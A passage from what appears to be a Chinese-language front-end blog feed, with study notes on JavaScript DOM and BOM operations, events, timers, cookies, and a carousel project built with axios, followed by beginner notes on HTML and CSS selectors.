title="Javascript操作DOM"></a>Javascript操作DOM</h1><ul><li><p>DOM(w3c提的⼀个标准)</p><ul><li>DOM就是⽂档对象模型，是⼀个抽象的概念</li><li>定义了访问和操作HTML⽂档的⽅法</li></ul></li><li><p>HTML和txt⽂本的区别</p><ul><li>HTML是有组织的结构化⽂件</li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218200324.png" alt="image-20211218200322962"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218200440.png" alt="image-20211218200439129"></p></li><li><p>什么是DOM树</p><ul><li>浏览器将结构化的⽂档以”树”的结构存储在浏览器内存⾥</li><li>每个HTML元素被定义为节点</li><li>这个节点有⾃⼰的属性(名称、类型、内容… …)</li><li>有⾃⼰的层级关系(parent, child, sibling)</li></ul></li><li><p>图解html树</p></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218153232.png" alt="image-20211218153229565"></p><p>查找节点</p><table><thead><tr><th align="center">⽅法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">document.getElementById(id)</td><td align="center">通过元素 id 来查找元素</td></tr><tr><td align="center">document.getElementsByTagName(name)</td><td align="center">通过标签名来查找元素</td></tr><tr><td align="center">document.getElementsByClassName(name)</td><td align="center">通过类名来查找元素</td></tr><tr><td align="center">document.querySelector(selector)</td><td align="center">通过css选择器选择元素，⽆法选择伪类</td></tr></tbody></table><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218201256.png" alt="image-20211218201254965"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218201452.png" alt="image-20211218201451200"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218201638.png" alt="image-20211218201636901"></p><p>改变元素内容</p><table><thead><tr><th align="center">⽅法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">element.innerHTML = new html content</td><td align="center">改变元素的 inner HTML</td></tr><tr><td align="center">element.attribute = new value</td><td align="center">改变 HTML 元素的属性值</td></tr><tr><td align="center">element.setAttribute(attribute, value)</td><td align="center">改变 HTML 元素的属性值</td></tr><tr><td align="center">element.style.property = new style</td><td align="center">改变 HTML 元素的样式</td></tr></tbody></table><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218202125.png" alt="image-20211218202123831"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218202325.png" alt="image-20211218202323511"></p><p>添加和删除元素</p><table><thead><tr><th align="center">⽅法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">document.createElement(element)</td><td align="center">创建 HTML 元素</td></tr><tr><td align="center">document.removeChild(element)</td><td align="center">删除 HTML 元素</td></tr><tr><td align="center">document.appendChild(element)</td><td align="center">添加 HTML 元素</td></tr><tr><td align="center">document.replaceChild(element)</td><td align="center">替换 HTML 元素</td></tr><tr><td align="center">document.write(text)</td><td align="center">可写⼊ HTML</td></tr></tbody></table><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218202850.png" alt="image-20211218202657638"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218202841.png" alt="image-20211218202840474"></p><p><strong>DOM中事件的概念</strong></p><ul><li><p>什么是事件</p><ul><li>事件指的是在html元素上发⽣的事情</li><li>⽐如图⽚元素被点击</li><li>事件触发时，可设置执行⼀段js代码</li></ul></li><li><p>常⻅的HTML事件</p><table><thead><tr><th align="center">描述</th><th align="center">事件</th></tr></thead><tbody><tr><td align="center">html元素发生改变</td><td align="center">onchange</td></tr><tr><td align="center">用户点击了元素</td><td align="center">onclick</td></tr><tr><td align="center">鼠标移动到了元素上</td><td align="center">onmouseover</td></tr><tr><td align="center">鼠标离开元素</td><td align="center">onmouseout</td></tr><tr><td align="center">按下键盘</td><td align="center">onkeydown</td></tr><tr><td align="center">页面已经完成加载</td><td align="center">onload</td></tr></tbody></table></li><li><p>怎么对事件作出反应</p><ul><li><p>通过元素的事件属性</p></li><li><p>启⽤事件监听器</p><ul><li><p>什么是事件监听器</p><ul><li><p>addEventListener给DOM对象添加事件处理程序</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218203633.png" alt="image-20211218203632257"></p></li><li><p>removeEventListener 删除给DOM对象的事件处理程序</p><p> <img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218203930.png" alt="image-20211218203928483"></p></li></ul></li></ul></li></ul></li><li><p>onclick和addEventListener的区别</p><ul><li><p>onclick会被覆盖</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218204151.png" alt="image-20211218204150113"></p></li><li><p>addEventListener可以同时注册多个，根据注册顺序，先后执⾏</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218204331.png" alt="image-20211218204329311"></p></li></ul><p><strong>JS事件中的⼀些机制</strong></p></li><li><p>事件传播的两种机制</p><ul><li><p>冒泡</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218204648.png" alt="image-20211218204646585"></p></li><li><p>捕获</p></li></ul></li><li><p>图解事件捕获和事件冒泡</p></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218153334.png" alt="image-20211218153326706"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218205046.png" alt="image-20211218205044726"></p><ul><li><p>什么是事件代理</p><ul><li><p>思考：⽗级那么多⼦元素，怎么区分事件本应该是哪个⼦元素的 找到target中的textcontent</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218205228.png" alt="image-20211218205227395"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218205339.png" alt="image-20211218205335069"></p><ul><li>事件代理就是利⽤事件冒泡，只指定⼀个事件处理程序，就可以管理某⼀类型的所有事件。</li></ul></li></ul></li><li><p>怎么取消冒泡或者捕获</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">event.stopPropagation();</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218205634.png" alt="image-20211218205633711"></p><p><strong>JavaScript中的定时器</strong></p><ul><li><p>延迟执⾏</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;, 毫秒)</span><br></pre></td></tr></table></figure><ul><li><p>停止</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearTimeout(timer) <span class="comment">// 参数必须是由 setTimeout() 返回的timer</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>定时执⾏</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;, 毫秒)</span><br></pre></td></tr></table></figure><ul><li><p>停止</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearInterval(timer) <span class="comment">// 参数必须是由 setInterval() 返回的timer</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h1 id="Javascript操作BOM"><a href="#Javascript操作BOM" class="headerlink" title="Javascript操作BOM"></a>Javascript操作BOM</h1><ul><li><p>什么是BOM</p><ul><li>浏览器对象模型（Browser Object Model (BOM)）</li></ul></li><li><p>内置对象</p><ul><li><p>window</p></li><li><p>screen</p></li><li><p>location</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218210320.png" alt="image-20211218210318812"></p></li><li><p>localStorage</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218210412.png" alt="image-20211218210410936"></p></li><li><p>history</p></li></ul></li><li><p>警告框</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="string">'hello'</span>) <span class="comment">//可以作为断点使用</span></span><br></pre></td></tr></table></figure></li><li><p>确认框</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> isConfirm = confirm(<span class="string">'请确认'</span>)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'下⼀步'</span>, isConfirm)<span class="comment">// 有返回值的</span></span><br></pre></td></tr></table></figure></li><li><p>提示框</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> isPrompt = prompt(<span class="string">'请输⼊姓名'</span>)js</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(isPrompt) <span class="comment">// 是null 或者 ⽤户输⼊的值</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218210912.png" alt="image-20211218210910660"></p></li></ul><p><strong>local storage 没有手动删除将永远存在</strong></p><p><strong>session storage 关闭浏览器就没有了</strong></p><p><strong>cookies storage 容量比较小 只有4kB</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218211806.png" alt="image-20211218211805166"></p><ul><li><p>什么是Cookie</p><ul><li><p>Cookie 是计算机上存储浏览器的数据⽤的</p></li><li><p>容量⼤⼩⼤概4KB</p></li><li><p>基本语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie</span><br></pre></td></tr></table></figure></li></ul></li><li><p>Cookie作用</p><ul><li>浏览器关闭后，服务器会忘记⽤户的⼀切</li><li>让浏览器记住⽤户信息：登录信息</li></ul></li><li><p>cookie操作</p><ul><li>如何创建和读取cookie</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 通过Document对象</span><br><span class="line">document.cookie&#x3D;&quot;username&#x3D;Nick; expires&#x3D;Thu, 18 Dec 2043 12:00:00 GMT&quot;;</span><br></pre></td></tr></table></figure><ul><li><p>删除cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 设置过期时间</span><br><span class="line">document.cookie &#x3D; &quot;username&#x3D;; expires&#x3D;Thu, 01 Jan 1970 00:00:00 UTC; path&#x3D;&#x2F;;&quot;;  &#x2F;&#x2F;  null</span><br></pre></td></tr></table></figure></li><li><p>设置cookie函数</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 保存cookie</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setCookie</span>(<span class="params">cname, cvalue, exdays</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">  d.setTime(d.getTime() + exdays * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span>);</span><br><span class="line">  <span class="keyword">var</span> expires = <span class="string">'expires='</span> + d.toGMTString();</span><br><span class="line">  <span class="built_in">document</span>.cookie = cname + <span class="string">'='</span> + cvalue + <span class="string">';'</span> + expires;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取cookie</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params">cname</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> name = cname + <span class="string">'='</span>;</span><br><span class="line">  <span class="keyword">var</span> ca = <span class="built_in">document</span>.cookie.split(<span class="string">';'</span>); <span class="comment">// 将多个cookie字符串以;分割数组;</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; ca.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (ca[i].indexOf(name)&gt;= <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> ca[i].split(<span class="string">'='</span>)[<span class="number">1</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkCookie</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> user=getCookie(<span class="string">"username"</span>);</span><br><span class="line">  <span class="keyword">if</span> (user)&#123;</span><br><span class="line">    alert(<span class="string">"欢迎 "</span> + user + <span class="string">" 再次访问"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    user = prompt(<span class="string">"请输入你的名字:"</span>,<span class="string">""</span>);</span><br><span class="line">      <span class="keyword">if</span> (user)&#123;</span><br><span class="line">        setCookie(<span class="string">"username"</span>,user,<span class="number">30</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="小滴课堂轮播图项目实战"><a href="#小滴课堂轮播图项目实战" class="headerlink" title="小滴课堂轮播图项目实战"></a>小滴课堂轮播图项目实战</h1><p>JSON</p><ul><li>JSON数据</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"code"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="string">"data"</span>: [</span><br><span class="line">    &#123; <span class="string">"name"</span>: <span class="string">"后端&amp;架构"</span> &#125;,</span><br><span class="line">    &#123; <span class="string">"name"</span>: <span class="string">"前端&amp;全栈"</span> &#125;,</span><br><span class="line">    &#123; <span class="string">"name"</span>: <span class="string">"测试&amp;测开"</span> &#125;,</span><br><span class="line">    &#123; <span class="string">"name"</span>: <span class="string">"运维&amp;容器"</span> &#125;,</span><br><span class="line">    &#123; <span class="string">"name"</span>: <span class="string">"架构&amp;管理"</span> &#125;,</span><br><span class="line">    &#123; <span class="string">"name"</span>: <span class="string">"算法|人工智能"</span> &#125;,</span><br><span class="line">    &#123; <span class="string">"name"</span>: <span class="string">"大数据"</span> &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>axios</p><p>官网：<a href="http://www.axios-js.com/zh-cn/docs/" target="_blank" rel="noopener">http://www.axios-js.com/zh-cn/docs/</a></p><ul><li><p>引入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"https://unpkg.com/axios/dist/axios.min.js"</span>&gt;&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">axios</span><br><span class="line">.get(<span class="string">'xxx'</span>)</span><br><span class="line">.then(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 请求到数据执行的操作</span></span><br><span class="line">&#125;)</span><br><span class="line">.catch(<span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123; <span class="comment">// 失败时抛出异常</span></span><br><span class="line">  <span class="built_in">console</span>.log(error);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ul><p><strong>轮播图左侧导航数据动态渲染</strong></p><ul><li><p>导航列表数据获取</p><ul><li>调用axios请求本地JSON数据</li><li>异步中加入回调函数</li></ul></li><li><p>插入到html对应的节点中</p><ul><li><p>for循环遍历插入对应节点中渲染</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218214548.png" alt="image-20211218214546676"></p></li></ul></li></ul><p><strong>轮播图图片和圆点动态渲染</strong></p><ul><li><p>轮播图片动态渲染</p><ul><li>调用axios请求本地json数据</li><li>for循环遍历插入对应节点中渲染</li></ul></li><li><p>圆点个数根据图片个数动态展示</p><ul><li><p>获取图片个数</p></li><li><p>for循环累加个数插入对应节点中渲染</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218214736.png" alt="image-20211218214735327"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218215424.png" alt="image-20211218215422664"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218222820.png" alt="image-20211218222816344"></p></li></ul></li></ul><p><strong>轮播图自动播放和圆点的样式自动切换</strong></p><ul><li><p>图片</p><ul><li><p>初始化第一张展示</p></li><li><p>定时器实现索引累加</p></li><li><p>通过索引动态展示图片</p><ul><li><p>注意：索引大于图片个数减一时，重置索引为0，小于0时，重置为图片个数减一</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218223138.png" alt="image-20211218223136560"></p><p>opacity不透明性 为0则说明透明，为1则说明不透明，展示的意思</p></li></ul></li></ul></li></ul><pre><code>![image-20211218223353033](https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218223355.png)![image-20211218231805759](https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218231807.png)代码还是有问题的![image-20211218231856268](https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218231858.png)![image-20211218232011675](https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218232013.png)![image-20211218232313408](https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218232314.png)</code></pre><ul><li><p>圆点</p><ul><li>设置选中时的样式</li><li>根据判断索引值来动态改变圆点样式</li></ul></li></ul><p><strong>轮播图箭头按钮和圆点交互</strong></p><ul><li><p>箭头按钮</p><ul><li>按钮添加点击监听事件</li><li>点击上一张索引减一，点击下一张索引加一</li><li>在函数内加入更换图片的回调函数</li></ul></li><li><p>圆点按钮</p><ul><li>遍历所有的圆点</li><li>给每个圆点添加点击监听事件</li><li>将点击的圆点索引赋值给公共索引</li><li>在函数内加入更换图片的回调函数</li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218232911.png" alt="image-20211218232909730"></p></li></ul><p><strong>轮播图效果优化之鼠标交互</strong></p><ul><li><p>轮播图效果优化</p><ul><li>获取按钮的节点</li><li>给节点添加鼠标悬停与离开的监听事件</li><li>鼠标悬停时清除定时器</li><li>鼠标离开时重新调用图片轮播</li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218233230.png" alt="image-20211218233228726"></p></li><li><p>样式问题</p></li><li><p>功能问题</p></li><li><p>解决思路</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;初识Javascript&quot;&gt;&lt;a href=&quot;#初识Javascript&quot; class=&quot;headerlink&quot; title=&quot;初识Javascript&quot;&gt;&lt;/a&gt;初识Javascript&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://gitee.com/Yu
      
    
    </summary>
    
    
      <category term="前端" scheme="https://blog.kaluna.top/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="Javascript" scheme="https://blog.kaluna.top/tags/Javascript/"/>
    
  </entry>
  
  <entry>
    <title>HTML+CSS基础到实战</title>
    <link href="https://blog.kaluna.top/2021/12/17/HTML+CSS%E5%9F%BA%E7%A1%80%E5%88%B0%E5%AE%9E%E6%88%98/"/>
    <id>https://blog.kaluna.top/2021/12/17/HTML+CSS%E5%9F%BA%E7%A1%80%E5%88%B0%E5%AE%9E%E6%88%98/</id>
    <published>2021-12-17T01:23:09.379Z</published>
    <updated>2021-12-17T13:24:32.640Z</updated>
    
    <content type="html"><![CDATA[<h1 id="迈入前端的第一步"><a href="#迈入前端的第一步" class="headerlink" title="迈入前端的第一步"></a>迈入前端的第一步</h1><ul><li><p>独⽴内核的浏览器的分类</p><ul><li>Chrome: Webkit / Blink</li><li>IE: Trident</li><li>Safari：Webkit</li><li>Firefox：Gecko</li><li>Opera: Presto / Blink</li></ul></li><li><p>文档声明</p><ul><li>告诉浏览器网页是以html5版本编写的</li></ul></li><li><p>meta标签</p><ul><li><p>自结束标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta&gt;</span><br><span class="line">&lt;link&gt;</span><br><span class="line">&lt;hr&gt; 一条横线</span><br><span class="line">&lt;img&gt; alt属性：图⽚加载失败或加载时显示的⽂字 title属性 悬浮在图⽚上⾯显示的⽂字</span><br><span class="line">&lt;input&gt;</span><br></pre></td></tr></table></figure></li><li><p>可以提供该网页相关信息,元数据</p></li><li><p>charset=”utf-8”：中文的网页需要用到的声明编码，否则会出现乱码</p></li><li><p>name=”keywords” content=”静夜思,诗词”：提供网页的关键字，关键字用,隔开</p></li><li><p>name=”Description”：描述网页的信息</p></li></ul></li><li><p>空格</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217100740.png" alt="image-20211217100041473"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;nbsp;</span><br></pre></td></tr></table></figure></li><li><p>语义化标签</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217102206.png" alt="image-20211217102204348"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217102118.png" alt="image-20211217102116764"></p></li><li><p>table元素⾥常⽤的属性</p><ul><li>border(边框)</li><li>cellspacing(规定单元格之间的空白)</li><li>cellpadding(规定单元边沿与其内容之间的空白)</li><li>colspan(⽤于合并列)</li><li>rowspan(⽤于合并⾏)</li></ul></li><li><p>a标签</p><ul><li><p>target属性：brank：打开新的浏览器标签</p></li><li><p>锚点 </p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211217102541.png" alt="image-20211217102540507"></p></li></ul></li></ul><ul><li><p>form标签：使⽤场景需要提交⼀些信息到服务端的时候(前后端联调过程中)</p><ul><li>核⼼元素input (核⼼元素)</li><li>label (提⾼交互体验的)</li><li>select(下拉框)</li><li>textarea(⽂本域)</li><li>button(按钮)</li><li>form(表单元素，提交每个表单项内容)</li></ul></li><li><p>块级元素</p><ul><li><p>块级元素在浏览器显示时，通常会以新行来开始（和结束）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;, &lt;p&gt;, &lt;ul&gt;, &lt;table&gt;,&lt;div&gt;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>行内元素</p><ul><li><p>行内元素在显示时通常不会以新行开始</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;b&gt;, &lt;td&gt;, &lt;a&gt;, &lt;img&gt;,&lt;span&gt;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h1 id="CSS入门之基本规则"><a href="#CSS入门之基本规则" class="headerlink" title="CSS入门之基本规则"></a>CSS入门之基本规则</h1><ul><li>选择器<ul><li>告诉浏览器要设置样式的html元素</li></ul></li><li>声明块<ul><li>⽤于设置样式</li></ul></li><li>层叠样式表</li><li>Viewport<ul><li>将网页的视口设置为完美视口，开发移动端页面时一定要加上</li></ul></li></ul><p><strong>CSS的⼏种写法及推荐写法</strong></p><ul><li>写法<ul><li>内部样式表<ul><li>写在元素的style标签⾥⾯的</li></ul></li><li>内联样式表<ul><li>写在styles属性⾥⾯的</li></ul></li><li>外部样式表<ul><li>link标签将css资源引⼊</li></ul></li></ul></li><li>为什么选择外部样式表<ul><li>解决⻚⾯当中样式重复的问题</li><li>代码分离，利于代码维护和阅读</li><li>浏览器会缓存起来，提⾼⻚⾯响应速度变快了</li></ul></li></ul><p><strong>CSS核⼼之常⻅的选择器及使⽤场景</strong></p><ul><li><p>元素（标签）选择器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">组合选择器: h1,p&#123;color:red&#125;</span><br></pre></td></tr></table></figure></li><li><p>类选择器</p><ul><li><p>结合标签选择器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h1.xiaodi &#123;color:red;&#125;</span><br></pre></td></tr></table></figure></li><li><p>多类选择器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class&#x3D;&quot;xiaodi background&quot;</span><br></pre></td></tr></table></figure></li><li><p>链接多个类选择器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.xiaodi.background&#123;color:red; background-color:black&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>id选择器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">声明：#important&#123;&#125; </span><br><span class="line">属性：id&#x3D;&quot;important</span><br><span class="line">注意：一个id选择器的属性值在html文档中只能出现一次，避免写js获取id时出现混淆</span><br></pre></td></tr></table></figure></li><li><p>通配符选择器*</p></li><li><p>派⽣选择器</p><ul><li><p>后代选择器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h1 p&#123;color:red;&#125;</span><br></pre></td></tr></table></figure></li><li><p>⼦元素选择器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">div&gt;span&#123;font-size:900&#125;</span><br></pre></td></tr></table></figure></li><li><p>相邻选择器（兄弟）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h1+p&#123;background-color:pink;&#125;</span><br></pre></td></tr></table></figure></li></ul><p><strong>CSS中特殊的选择器—伪类选择器的使⽤</strong></p></li><li><p>特殊的选择器</p><ul><li>伪类选择器<ul><li>不改变任何DOM内容。只是插入了一些修饰类的元素</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:first-child &#123;&#125;     &#x2F;&#x2F;第一项</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:last-child &#123;&#125;      &#x2F;&#x2F;最后一项</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:nth-child(n) &#123;&#125;    &#x2F;&#x2F;第n项</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:nth-child(2n+1)&#123;&#125;  &#x2F;&#x2F;奇数项</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:nth-child(2n) &#123;&#125;   &#x2F;&#x2F;偶数项</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:not()              &#x2F;&#x2F;否定伪类 除了第n项</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:link &#123;color:#FF0000;&#125;     &#x2F;*未访问的链接*&#x2F;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:visited &#123;color:#00FF00;&#125;  &#x2F;*已访问的链接*&#x2F;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:hover &#123;color:#FF00FF;&#125;    &#x2F;*⿏标悬浮后的链接*&#x2F;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:active &#123;color:#0000FF;&#125;   